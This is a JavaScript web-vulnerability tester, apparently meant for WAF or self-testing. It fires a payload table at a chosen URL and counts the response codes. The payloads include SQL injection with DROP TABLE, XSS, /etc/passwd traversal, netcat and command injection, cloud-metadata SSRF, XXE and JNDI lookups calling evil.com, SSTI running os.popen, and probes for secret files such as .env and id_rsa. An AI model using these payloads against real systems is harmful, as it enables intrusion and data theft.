// Configuration et payloads
const PAYLOADS = {
    'SQL Injection': [
        "' OR '1'='1",
        "1; DROP TABLE test --",
        "admin' --",
        "' OR 1=1--",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR SLEEP(5)--",
        "' OR 1=1 LIMIT 1;--",
        "WAITFOR DELAY '0:0:5'",
        ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "%2553%2527%2520OR%25201%253D1",
        "/**/OR/**/1=1"
    ],
    'XSS': [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<svg/onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<a href=javascript:alert('xss')>click</a>",
        "<math href=javascript:alert(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
        "<marquee onstart=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
        "<input onfocus=alert(1) autofocus>"
    ],
    'Path Traversal': [
        "../../etc/passwd",
        "../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ],
    'Command Injection': [
        "$(cat /etc/passwd)",
        "| cat /etc/passwd",
        "; ls -la",
        "& whoami",
        "| id",
        "; ping -c 10 127.0.0.1",
        "| nc -lvp 4444"
    ],
    'SSRF': [
        "http://127.0.0.1/",
        "file:///etc/passwd",
        "http://127.0.0.1/latest/meta-data/",
        "http://localhost:80/",
        "http://0.0.0.0:80/",
        "http://[::1]/",
        "http://example.com@127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::ffff:127.0.0.1]",
        "http://127.1",
        "http://0177.0.0.1",
        "http://2130706433"
    ],
    'NoSQL Injection': [
        "{'$gt':''}",
        "{\"$ne\":null}",
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "{\"$where\": \"this.password == this.passwordConfirm\"}",
        "{\"$or\": [{}, {}]}"
    ],
    'Local File Inclusion': [
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd",
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/proc/self/environ",
        "index.php%00.jpg"
    ],
    'LDAP Injection': [
        "*)(|(uid=*))",
        "*))(objectClass=*))(|(objectClass=*)",
        "admin)(|(password=*))"
    ],
    'HTTP Request Smuggling': [
        "Transfer-Encoding: chunked 0 GARBAGE",
        "0 GET / HTTP/1.1 Host: example.com"
    ],
    'Open Redirect': [
        "//evil.com",
        "http://evil.com",
        "/\\evil.com",
        "//google.com%2F%2Fevil.com",
        "/login?Redirect=http://evil.com",
        "/login?Redirect=../../../..//evil.com"
    ],
    'Sensitive Files': [
        ".git",
        ".git/config",
        ".gitignore",
        "requirements.txt",
        "composer.json",
        "composer.lock",
        "package.json",
        "package-lock.json",
        "yarn.lock",
        "config.php",
        "wp-config.php",
        ".env",
        "docker-compose.yml",
        "id_rsa",
        "id_rsa.pub",
        "web.config",
        "appsettings.json",
        "database.yml",
        ".htpasswd",
        ".htaccess",
        "database.bak"
    ],
    'CRLF Injection': [
        "%0d%0aSet-Cookie: malicious=true",
        "Location: http://malicious.com",
        "%0d%0aContent-Length:0",
        "%250d%250aContent-Length:0"
    ],
    'UTF8/Unicode Bypass': [
        "\\u0027 OR \\u00271\\u0027=\\u00271",
        "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",
        "Ω OR Ω=Ω"
    ],
    'XXE': [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",
        "<?xml version=\"1.0\"?><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>"
    ],
    'SSTI': [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{=7*7}}",
        "#{7*7}",
        "{{7*'7'}}",
        "{{config}}",
        "{{self}}",
        "{{[].__class__.__mro__[1].__subclasses__()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "<%={{7*7}}%>",
        "${{7*7}}",
        "{{request}}",
        "{{url_for}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}"
    ],
    'HTTP Parameter Pollution': [
        "param=1&param=2",
        "user=admin&user=guest",
        "id=1;id=2",
        "id=1&&id=2",
        "id=1,id=2",
        "id=1 id=2",
        "id=1&id=",
        "param=&param=2",
        "param=1&Param=2",
        "param[0]=1&param[1]=2",
        "param[]=1&param[]=2",
        "param=1&%70%61%72%61%6d=2",
        "param=1&par%61m=2",
        "param.1=1&param.2=2",
        "param=1|param=2",
        "param[a]=1&param[b]=2"
    ],
    'Web Cache Poisoning': [
        "X-Forwarded-Host: evil.com",
        "X-Original-URL: /admin",
        "Cache-Control: no-cache",
        "X-Forwarded-Proto: https",
        "X-Host: evil.com",
        "X-Forwarded-Scheme: javascript://",
        "X-HTTP-Method-Override: PURGE",
        "X-Forwarded-Server: evil.com",
        "X-Forwarded-Port: 443",
        "X-Original-Host: evil.com"
    ],
    'IP Bypass': [
        "X-Forwarded-For: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Forwarded-For: 127.0.0.1, evil.com",
        "X-Forwarded-For: 127.0.0.1, 2130706433",
        "X-Forwarded-For: 127.0.0.1, localhost",
        "X-Forwarded-For: 127.0.0.1, 0.0.0.0",
        "X-Forwarded-For: 127.0.0.1, ::1",
        "X-Forwarded-For: 127.0.0.1, 0177.0.0.1",
        "X-Forwarded-For: 127.0.0.1, 127.1"
    ],
    'User-Agent': [
        "User-Agent:",
        "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",
        "User-Agent: {{7*7}}",
        "User-Agent: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "User-Agent: <script>alert('xss')</script>",
        "User-Agent: %0d%0aSet-Cookie: injected=true",
        "User-Agent: ' OR '1'='1",
        "User-Agent: *)(uid=*))(|(uid=*)",
        "User-Agent: ${jndi:ldap://evil.com/a}",
        "User-Agent: Fuzz Faster U Fool",
        "User-Agent: feroxbuster/2.10.0",
        "User-Agent: gobuster/3.1.0",
        "User-Agent: Firefox"
    ]
};

// Variables globales
let results = [];
let stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
let isRunning = false;
let shouldStop = false;

// Initialisation
document.addEventListener('DOMContentLoaded', () => {
    // URL par défaut
    document.getElementById('targetUrl').value = window.location.origin;
    
    // Générer les catégories
    const categoriesDiv = document.getElementById('categories');
    Object.keys(PAYLOADS).forEach(category => {
        const label = document.createElement('label');
        label.className = 'flex items-center bg-gray-900 px-3 py-2 rounded cursor-pointer border-2 border-gray-700 hover:border-red-500 transition-all';
        label.innerHTML = `
            <input type="checkbox" class="mr-2 category-checkbox" value="${category}" checked>
            <span class="text-white text-sm">${category}</span>
        `;
        categoriesDiv.appendChild(label);
    });
});

// Fonctions principales
async function runAllTests() {
    const targetUrl = document.getElementById('targetUrl').value.trim();
    if (!targetUrl) {
        alert('Veuillez entrer une URL cible');
        return;
    }

    // Récupérer les méthodes sélectionnées
    const methods = Array.from(document.querySelectorAll('input[type="checkbox"][value]'))
        .filter(cb => ['GET', 'POST', 'PUT', 'DELETE'].includes(cb.value) && cb.checked)
        .map(cb => cb.value);

    if (methods.length === 0) {
        alert('Veuillez sélectionner au moins une méthode HTTP');
        return;
    }

    // Récupérer les catégories sélectionnées
    const categories = Array.from(document.querySelectorAll('.category-checkbox:checked'))
        .map(cb => cb.value);

    if (categories.length === 0) {
        alert('Veuillez sélectionner au moins une catégorie');
        return;
    }

    // Réinitialiser
    results = [];
    stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
    shouldStop = false;
    isRunning = true;

    document.getElementById('stopBtn').style.display = 'block';
    document.getElementById('progressBar').style.display = 'block';

    // Construire la liste des tests
    const tests = [];
    categories.forEach(category => {
        const payloads = PAYLOADS[category];
        methods.forEach(method => {
            payloads.forEach(payload => {
                tests.push({ category, method, payload });
            });
        });
    });

    const total = tests.length;
    let completed = 0;

    // Lancer les tests avec concurrence limitée
    const concurrency = 5;
    for (let i = 0; i < tests.length; i += concurrency) {
        if (shouldStop) break;

        const batch = tests.slice(i, i + concurrency);
        await Promise.all(batch.map(test => runSingleTest(targetUrl, test)));

        completed += batch.length;
        updateProgress(completed, total);
    }

    isRunning = false;
    document.getElementById('stopBtn').style.display = 'none';
    updateStats();
}

async function runSingleTest(baseUrl, { category, method, payload }) {
    try {
        let url = baseUrl;
        let options = {
            method: method,
            headers: {
                'X-Vuln-Type': category.toLowerCase().replace(/\s+/g, '-')
            }
        };

        // Construire l'URL et les options selon la catégorie
        if (category === 'Sensitive Files') {
            url = `${baseUrl}/${payload}`;
        } else if (category.includes('Header') || category.includes('Cache') || category.includes('IP') || category === 'User-Agent') {
            // Headers spéciaux
            const [headerName, headerValue] = payload.split(':').map(s => s.trim());
            if (headerName && headerValue) {
                options.headers[headerName] = headerValue;
            }
            url = `${baseUrl}/?test=${encodeURIComponent(payload)}`;
        } else if (method === 'GET') {
            url = `${baseUrl}/?payload=${encodeURIComponent(payload)}`;
        } else {
            // POST, PUT, DELETE
            if (category === 'XXE') {
                options.headers['Content-Type'] = 'application/xml';
                options.body = payload;
            } else if (payload.startsWith('{')) {
                options.headers['Content-Type'] = 'application/json';
                options.body = payload;
            } else {
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                options.body = `payload=${encodeURIComponent(payload)}`;
            }
        }

        const response = await fetch(url, options);
        const status = response.status;

        let statusLabel = status.toString();
        if (status >= 300 && status < 400) statusLabel = '301';
        else if (status === 403) statusLabel = '403';
        else if (status >= 200 && status < 300) statusLabel = '200';
        else statusLabel = 'ERR';

        results.push({
            category,
            method,
            status: statusLabel,
            payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
        });

        stats.total++;
        stats[statusLabel] = (stats[statusLabel] || 0) + 1;

        updateTable();
        updateStats();

    } catch (error) {
        results.push({
            category,
            method,
            status: 'ERR',
            payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
        });

        stats.total++;
        stats['err']++;

        updateTable();
        updateStats();
    }
}

function stopTests() {
    shouldStop = true;
    isRunning = false;
    document.getElementById('stopBtn').style.display = 'none';
}

function clearResults() {
    results = [];
    stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
    updateTable();
    updateStats();
    document.getElementById('progressBar').style.display = 'none';
}

function updateProgress(current, total) {
    const percent = (current / total * 100).toFixed(1);
    document.getElementById('progress').style.width = percent + '%';
    document.getElementById('progressText').textContent = `${current} / ${total}`;
}

function updateTable() {
    const tbody = document.getElementById('resultsTable');
    
    if (results.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="4" class="py-8 text-center text-gray-500">
                    Aucun résultat. Lancez les tests pour commencer.
                </td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = results.slice(-50).reverse().map(result => `
        <tr class="hover:bg-gray-700 transition-all">
            <td class="py-3 px-4 text-white">${result.category}</td>
            <td class="py-3 px-4">
                <span class="px-2 py-1 rounded text-xs font-semibold ${getMethodColor(result.method)}">${result.method}</span>
            </td>
            <td class="py-3 px-4">
                <span class="status-${result.status.toLowerCase()} px-3 py-1 rounded text-white font-semibold">${result.status}</span>
            </td>
            <td class="py-3 px-4 text-gray-300 font-mono text-xs break-all">${escapeHtml(result.payload)}</td>
        </tr>
    `).join('');
}

function updateStats() {
    document.getElementById('stat-total').textContent = stats.total;
    document.getElementById('stat-200').textContent = stats['200'] || 0;
    document.getElementById('stat-403').textContent = stats['403'] || 0;
    document.getElementById('stat-301').textContent = stats['301'] || 0;
    document.getElementById('stat-err').textContent = stats['err'] || 0;
}

function getMethodColor(method) {
    const colors = {
        'GET': 'bg-blue-600 text-white',
        'POST': 'bg-green-600 text-white',
        'PUT': 'bg-yellow-600 text-white',
        'DELETE': 'bg-red-600 text-white'
    };
    return colors[method] || 'bg-gray-600 text-white';
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
